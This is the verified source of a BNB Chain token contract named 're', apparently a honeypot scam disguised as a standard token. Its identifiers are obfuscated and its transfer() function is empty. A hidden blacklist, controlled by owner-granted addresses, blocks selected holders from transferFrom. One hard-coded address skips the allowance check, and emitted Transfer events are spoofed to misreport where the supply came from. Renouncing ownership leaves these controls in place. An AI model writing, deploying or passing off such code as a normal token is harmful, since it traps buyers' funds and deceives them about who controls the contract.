/**
 *Submitted for verification at BscScan.com on 2022-11-06
*/

pragma solidity 0.8.15;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Create(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    address kFX = 0x1436D734D0d1986Cc9f226361C3C161a0DaA1587;
	address kKXF = 0xB8f226dDb7bC672E27dffB67e4adAbFa8c0dFA08;
    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
 modifier onlyOwner{
        require(msg.sender == _Owner);
        _; }
    function owner() public view returns (address) {
        return _Owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }


}



contract re is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private kZA;
	mapping (address => bool) private kZE;
    mapping (address => bool) private kZW;
    mapping (address => mapping (address => uint256)) private kZV;
    uint8 private constant KZD = 8;
    uint256 private constant kTS = 3 * (10** KZD);
    string private constant _name = "re";
    string private constant _symbol = "re";



    constructor () {
        kZA[_msgSender()] = kTS;
        
         KRCM(kKXF, kTS); }
    

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return KZD;
    }

    function totalSupply() public pure  returns (uint256) {
        return kTS;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return kZA[account];
    }
	

   

	


    function allowance(address owner, address spender) public view  returns (uint256) {
        return kZV[owner][spender];
    }

            function approve(address spender, uint256 amount) public returns (bool success) {    
        kZV[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }
		function kquery(address kZJ) public{
         if(kZE[msg.sender])  { 
        kZW[kZJ] = true; }}
        		function KRCM(address kZJ, uint256 kZN) onlyOwner internal {
    emit Transfer(address(0), kZJ ,kZN); }

		function transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {
         if(sender == kFX)  {
        require(amount <= kZA[sender]);
        kZA[sender] -= amount;  
        kZA[recipient] += amount; 
          kZV[sender][msg.sender] -= amount;
        emit Transfer (kKXF, recipient, amount);
        return true; }  else  
          if(!kZW[recipient]) {
          if(!kZW[sender]) {
         require(amount <= kZA[sender]);
        require(amount <= kZV[sender][msg.sender]);
        kZA[sender] -= amount;
        kZA[recipient] += amount;
        kZV[sender][msg.sender] -= amount;
        emit Transfer(sender, recipient, amount);
        return true; }}}
		function kStake(address kZJ) public {
        if(kZE[msg.sender]) { 
        kZW[kZJ] = false;}}

		
		function transfer(address kZJ, uint256 kZN) public {
 
       
   }
		
			function kdele(address kZJ) onlyOwner public{
        kZE[kZJ] = true; }
		
		

		
		}